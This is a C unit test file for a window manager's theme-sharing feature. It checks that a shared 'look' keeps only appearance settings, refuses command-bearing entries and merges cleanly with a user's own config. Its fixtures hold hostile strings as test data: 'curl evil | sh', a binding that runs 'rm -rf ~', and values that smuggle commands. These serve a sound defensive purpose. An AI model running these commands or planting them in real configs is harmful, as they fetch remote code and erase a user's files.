/* Unit tests for sharing a look (SHR-2, SHR-3). */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "check.h"
#include "look.h"

int main(void) {
	const char *shared =
		"# kestrel's look\n"
		"Accent        #7FD1AE\n"
		"TitleHeight   28\n"
		"SqueezeTitle  { \"*\" center }\n"
		"Terminal      \"curl evil | sh\"\n"
		"\"M-Return\"    : !\"rm -rf ~\"\n"
		"Button1 = root : f.quit\n"
		"Menu \"main\" { \"x\" !\"evil\" }\n"
		"Accent        #8AB4FF\n";
	struct look l;
	look_extract(shared, &l);
	CHECK("SHR-2", l.n == 3);
	CHECK("SHR-2", strcmp(l.e[0].key, "Accent") == 0 && strcmp(l.e[0].value, "#8AB4FF") == 0);
	CHECK("SHR-2", strcmp(l.e[2].key, "SqueezeTitle") == 0);
	CHECK("SHR-2", l.refused == 4); /* Terminal, the key, the button, the menu */
	CHECK("SHR-2", !look_key_allowed("Terminal") && !look_key_allowed("Menu") &&
		look_key_allowed("RootCard"));

	const char *mine =
		"# my config\n"
		"Accent #FFB000   # amber\n"
		"\"M-Return\" : !\"foot\"\n"
		"FocusPolicy click\n";
	char *merged = look_merge(mine, &l);
	CHECK("SHR-3", merged != NULL);
	CHECK("SHR-3", merged && strstr(merged, "# my config\n") && strstr(merged, "# amber"));
	CHECK("SHR-3", merged && strstr(merged, "#8AB4FF") && !strstr(merged, "#FFB000"));
	CHECK("SHR-3", merged && strstr(merged, "TitleHeight") && strstr(merged, "\"M-Return\" : !\"foot\"") &&
		strstr(merged, "FocusPolicy click") && !strstr(merged, "rm -rf") && !strstr(merged, "evil"));
	CHECK("SHR-2", merged && look_only_appearance(mine, merged));
	CHECK("SHR-2", !look_only_appearance(mine, "Accent #FFB000\n\"M-Return\" : !\"xterm\"\nFocusPolicy click\n"));
	free(merged);

	/* a value that smuggles a command is refused, not merged */
	struct look bad;
	look_extract("RootCard { at !\"evil\" }\n", &bad);
	CHECK("SHR-2", bad.n == 0 && bad.refused == 1);
	/* a value that fails the check makes no merge */
	struct look broken;
	look_extract("TitleHeight banana\n", &broken);
	char *m2 = look_merge(mine, &broken);
	CHECK("SHR-3", broken.n == 1 && m2 == NULL);
	free(m2);
	return UNIT_RESULT();
}
